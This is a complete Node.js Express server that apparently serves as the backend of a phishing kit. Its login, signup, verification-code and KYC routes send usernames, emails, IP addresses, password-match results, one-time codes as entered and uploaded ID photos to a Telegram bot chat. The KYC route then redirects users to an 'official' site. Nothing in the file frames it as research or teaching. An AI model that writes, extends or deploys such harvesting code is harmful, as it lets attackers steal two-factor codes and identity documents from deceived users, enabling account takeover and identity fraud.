// server.js
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const FormData = require("form-data");
const bcrypt = require("bcrypt");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const upload = multer({ dest: "uploads/" });

// ========== CONFIG (set these as Render env vars or edit here for testing) ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const OFFICIAL_SITE = process.env.OFFICIAL_SITE || "https://your-official-website.com";
// =====================================================================================

// simple sqlite DB for demo (stores username,email,hashed password)
const DB_PATH = path.join(__dirname, "data.db");
const db = new sqlite3.Database(DB_PATH);
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE,
    email TEXT,
    password_hash TEXT,
    created_at INTEGER
  )`);
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// helpers
function escapeHtml(str = "") {
  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}
function clientIp(req) {
  const hf = req.headers['x-forwarded-for'];
  if (hf) return hf.split(',')[0].trim();
  return (req.ip || (req.connection && req.connection.remoteAddress) || 'unknown').toString();
}

async function sendTelegramText(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("Telegram not configured - skipping send");
    return { ok: false, error: "no_telegram_config" };
  }
  try {
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
    });
    return await resp.json();
  } catch (err) {
    console.error("sendTelegramText error:", err);
    return { ok: false, error: err.message || "fetch_failed" };
  }
}

async function sendTelegramPhoto(filePath, caption = "") {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log("Telegram not configured - skipping photo");
    return { ok: false, error: "no_telegram_config" };
  }
  try {
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    if (caption) form.append("caption", caption);
    form.append("photo", fs.createReadStream(filePath));
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    return await resp.json();
  } catch (err) {
    console.error("sendTelegramPhoto error:", err);
    return { ok: false, error: err.message || "photo_send_failed" };
  }
}

function passwordStrength(pw = "") {
  if (!pw) return "empty";
  const len = pw.length;
  const hasLower = /[a-z]/.test(pw);
  const hasUpper = /[A-Z]/.test(pw);
  const hasDigit = /[0-9]/.test(pw);
  const hasSymbol = /[^A-Za-z0-9]/.test(pw);
  const variety = [hasLower, hasUpper, hasDigit, hasSymbol].filter(Boolean).length;
  if (len >= 12 && variety >= 3) return "strong";
  if (len >= 8 && variety >= 2) return "medium";
  return "weak";
}

// ROUTES

// POST /login
app.post("/login", async (req, res) => {
  try {
    const username = (req.body.username || "").trim();
    const password = (req.body.password || "").toString();
    if (!username || !password) return res.json({ ok: false, error: "missing_username_or_password" });

    db.get("SELECT * FROM users WHERE username = ?", [username], async (err, row) => {
      if (err) { console.error("db error", err); return res.json({ ok: false, error: "db_error" }); }

      const ip = clientIp(req);
      const time = new Date().toISOString();
      const length = password.length;
      const strength = passwordStrength(password);

      let matchStatus = "user_not_found";
      if (row && row.password_hash) {
        const matched = await bcrypt.compare(password, row.password_hash);
        matchStatus = matched ? "password_OK" : "password_mismatch";
      }

      const message = `<b>Login attempt</b>\n👤 Username: ${escapeHtml(username)}\n🕒 ${time}\n🌐 IP: ${escapeHtml(ip)}\n🔢 Password length: ${length}\n🔒 Strength: ${strength}\n✅ Result: ${matchStatus}`;

      const sent = await sendTelegramText(message);
      if (sent && sent.ok) return res.json({ ok: true });
      return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
    });
  } catch (err) {
    console.error("login error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// POST /signup
app.post("/signup", async (req, res) => {
  try {
    const fullname = (req.body.fullname || "").trim();
    const email = (req.body.email || "").trim();
    const password = (req.body.password || "").toString();
    if (!fullname || !email || !password) return res.json({ ok: false, error: "missing_fields" });

    const username = email.split("@")[0];
    const hash = await bcrypt.hash(password, 10);
    const now = Date.now();

    db.run("INSERT INTO users (username,email,password_hash,created_at) VALUES (?, ?, ?, ?)",
      [username, email, hash, now], async function (err) {
        if (err) { console.error("signup db error:", err.message); return res.json({ ok: false, error: "db_error", detail: err.message }); }
        const ip = clientIp(req);
        const text = `<b>New signup</b>\n👤 ${escapeHtml(fullname)}\n✉️ ${escapeHtml(email)}\n🕒 ${new Date().toISOString()}\n🌐 IP: ${escapeHtml(ip)}`;
        const sent = await sendTelegramText(text);
        if (sent && sent.ok) return res.json({ ok: true });
        return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
      });
  } catch (err) {
    console.error("signup error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// POST /code
app.post("/code", async (req, res) => {
  try {
    const code = (req.body.code || "").toString().trim();
    if (!code) return res.json({ ok: false, error: "missing_code" });
    const ip = clientIp(req);
    const text = `<b>Verification code entered</b>\n🔢 Code: ${escapeHtml(code)}\n🕒 ${new Date().toISOString()}\n🌐 IP: ${escapeHtml(ip)}`;
    const sent = await sendTelegramText(text);
    if (sent && sent.ok) return res.json({ ok: true });
    return res.json({ ok: false, error: "telegram_send_failed", detail: sent });
  } catch (err) {
    console.error("code error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

// POST /kyc (accepts fields: photo1, photo2, photo3 + photo1_label etc.)
const kycUpload = upload.fields([{ name: "photo1" }, { name: "photo2" }, { name: "photo3" }]);
app.post("/kyc", kycUpload, async (req, res) => {
  try {
    const fullname = (req.body.fullname || "").trim();
    const email = (req.body.email || "").trim();
    const password = (req.body.password || "").toString(); // will be hashed/stored if email provided
    const ip = clientIp(req);

    if (email && password) {
      const hash = await bcrypt.hash(password, 10);
      db.get("SELECT id FROM users WHERE email = ?", [email], (err, row) => {
        if (!err && row && row.id) db.run("UPDATE users SET password_hash = ? WHERE id = ?", [hash, row.id]);
        else db.run("INSERT INTO users (username,email,password_hash,created_at) VALUES (?, ?, ?, ?)", [email.split("@")[0], email, hash, Date.now()]);
      });
    }

    // collect file infos: { path, label }
    const fileInfos = [];
    if (req.files) {
      ["photo1","photo2","photo3"].forEach((k) => {
        if (req.files[k] && req.files[k][0]) {
          const p = req.files[k][0].path;
          const label = (req.body && req.body[k + "_label"]) ? req.body[k + "_label"] : k;
          fileInfos.push({ path: p, label });
        }
      });
    }

    if (!fileInfos.length) return res.json({ ok: false, error: "no_photos_uploaded" });

    const captionBase = `<b>KYC Submission</b>\n👤 ${escapeHtml(fullname || 'N/A')}\n✉️ ${escapeHtml(email || 'N/A')}\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${new Date().toISOString()}`;

    for (let i = 0; i < fileInfos.length; i++) {
      const info = fileInfos[i];
      const filePath = path.join(__dirname, info.path);
      const fullCaption = `${captionBase}\n${escapeHtml(info.label)} — Photo ${i+1} of ${fileInfos.length}`;
      const sent = await sendTelegramPhoto(filePath, fullCaption);
      fs.unlink(filePath, (err) => { if (err) console.error("unlink error:", err); });
      if (!sent || !sent.ok) return res.json({ ok: false, error: "telegram_photo_failed", detail: sent });
    }

    return res.json({ ok: true, redirect: OFFICIAL_SITE });
  } catch (err) {
    console.error("kyc error:", err);
    return res.json({ ok: false, error: "server_error" });
  }
});

app.get("/health", (req, res) => res.json({ ok: true }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));